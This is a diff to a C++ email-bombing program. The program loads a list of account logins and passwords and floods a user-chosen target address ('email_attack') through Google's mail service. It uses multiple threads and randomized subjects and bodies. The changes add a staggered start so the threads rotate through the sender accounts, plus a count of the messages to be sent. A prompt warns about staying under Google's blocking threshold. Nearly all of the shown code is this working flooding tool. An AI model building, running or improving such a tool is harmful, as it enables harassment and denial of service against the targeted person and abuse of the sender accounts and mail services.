@@ -8,7 +8,7 @@
 #include <sstream>
 
 #define CREATE_BY		"IGORERFC"
-#define VERSION			"VERSION 3.55"
+#define VERSION			"VERSION 3.60"
 
 using namespace std;
 
@@ -184,34 +184,59 @@ string what_str(string str_input)
 			return str_input;
 }
 
+
+int vec_const_init(int begin_send,int size_vec)
+{
+	int int_for_ret=0;
+	for(int i=0;i<begin_send;i++){
+		int_for_ret ++;
+		if(int_for_ret == size_vec)int_for_ret = 0;
+	}
+	return int_for_ret;
+}
+
 //Sending emails (in the amount specified by the user)
 void use_threads_for_send_mail(	vector <account> emails, 
-				int num_cy,
-				string email_attack, 
-				email_content content) 
+								int num_cy,
+								int begin_send,
+								string email_attack, 
+								email_content content
+								) 
 {	
 	CURLcode err;
-	for (int i = 0; i < num_cy; i++)
-		for (const auto & email : emails)
+	
+	const int vec_email_begin = vec_const_init(begin_send,emails.size());
+	int vec_email_num = vec_email_begin;
+	
+	for (int i = 0; i < num_cy; i++){
+		while(!NULL)
 		{
 			err = sendEmail
 					(
-						email_attack		 .c_str(),
-						email.login		 .c_str(),
-						email.pass		 .c_str(),
-						what_str(content.name) 	 .c_str(),
-						what_str(content.subject).c_str(),
-						what_str(content.body)	 .c_str(),
-						google_service		 .c_str()
+						email_attack			 	.c_str(),
+						emails[vec_email_num].login		.c_str(),
+						emails[vec_email_num].pass		.c_str(),
+						what_str(content.name) 	 		.c_str(),
+						what_str(content.subject)		.c_str(),
+						what_str(content.body)	 		.c_str(),
+						google_service			 	.c_str()
 					);
-				if(err)
-				{
-					v_error("curl_easy_perform() failed: \n "+(string)curl_easy_strerror(err),error_nof);
-					number_of_errors++;
-				}
-				else
-					cout << " Sent to " + email_attack + " from " + email.login << endl;
+			if(err)
+			{
+				v_error("curl_easy_perform() failed: \n "+(string)curl_easy_strerror(err) + " " + emails[vec_email_num].login,error_nof);
+				number_of_errors++;
+			}
+			else
+				cout << " Sent to - " 	<< email_attack << endl
+					 << " From - " 		<< emails[vec_email_num].login << endl
+					 << " Thread ID - " << this_thread::get_id() << endl << endl;
+				
+			vec_email_num++;	
+			if(vec_email_num == (int)emails.size()) vec_email_num = 0;
+			if(vec_email_num == vec_email_begin) break;
 		}
+		vec_email_num = vec_email_begin;
+	}
 }
 
 //Getting text from a file text.txt
@@ -255,7 +280,7 @@ account string_to_account(string str_input)
 void get_mail_from_txt(vector <account> *emails,string file_name)
 {
 	stringstream text(get_text_from_txt(file_name));
-   	string line;
+	string line;
 	while(std::getline(text, line))
         	emails->push_back(string_to_account(line));
 }
@@ -310,15 +335,15 @@ int main()
 	std::cout << " Write an email address for sending messages : "	;std::getline ( std::cin,email_attack);
 	write_file(email_attack+'\n',name_file_history);
 	
-	std::cout << endl << " ! Write r for random  ! "<< endl;
-	std::cout << " ! Write s for sequence !  "<< endl << endl;
+	cout << endl << " ! Write r for random  ! "<< endl;
+	cout << " ! Write s for sequence !  "<< endl << endl;
 	
-	std::cout << " Enter your name : "								;std::getline ( std::cin,content.name);
-	std::cout << " Enter the subject of the letter (should r/s) : "	;std::getline ( std::cin,content.subject);
+	cout << " Enter your name : "					;std::getline ( std::cin,content.name);
+	cout << " Enter the subject of the letter (should r/s) : "	;std::getline ( std::cin,content.subject);
 	
-	std::cout << endl << " ! Enter fr to use the text from the file !  " << endl << endl;
+	cout << endl << " ! Enter fr to use the text from the file !  " << endl << endl;
 	
-	std::cout << " Enter the text of the letter  : "				;std::getline ( std::cin,content.body);
+	cout << " Enter the text of the letter  : "			;std::getline ( std::cin,content.body);
 	
 	if(content.body == "fr") 
 	{
@@ -326,17 +351,19 @@ int main()
 		cout << endl <<" The text was taken from the file successfully ! " << endl;
 	}
 	
-	std::cout << endl << " ! r/s doesn't work here ! "<< endl << endl;
+	cout << endl << " ! r/s doesn't work here ! "<< endl << endl;
 	
-	std::cout << " Enter the number of cycles  ( min - 1 ) : ";
-	std::cin >> num_cy;
+	cout << " Enter the number of cycles  ( min - 1 ) : ";
+	cin >> num_cy;
 	
 	if (num_cy < 1)	v_error(" Invalid input data ",fatalerror);
 	
-	std::cout << endl << " Don't specify too much threads, google services will block you ( 10 < )" << endl << endl;
-	std::cout << " Enter the number of threads ( min - 1 ) : ";std::cin>>num_threads;cout<<endl;
+	cout << endl << " Don't specify too much threads, google services will block you ( 10 < )" << endl << endl;
+	cout << " Enter the number of threads ( min - 1 ) : ";std::cin>>num_threads;cout<<endl;
 	
 	if (num_threads < 1)v_error(" Invalid input data ",fatalerror);
+	
+	cout <<" "<< num_cy * num_threads * emails.size() << " - will be sent " << endl << endl;
 	/*Read end*/
 	
 	
@@ -348,6 +375,7 @@ int main()
 		use_threads_for_send_mail, 
 		emails, 
 		num_cy,
+		i,
 		email_attack,
 		content
 		);
@@ -357,7 +385,7 @@ int main()
 	
 	
 	/*Output of the work result*/
-	cout << endl << " " << num_cy * num_threads * emails.size() - number_of_errors << " - emails sent successfully !" << endl;
+	cout << " " << num_cy * num_threads * emails.size() - number_of_errors << " - emails sent successfully !" << endl;
 	/*Output of the work result end*/
 	
 }
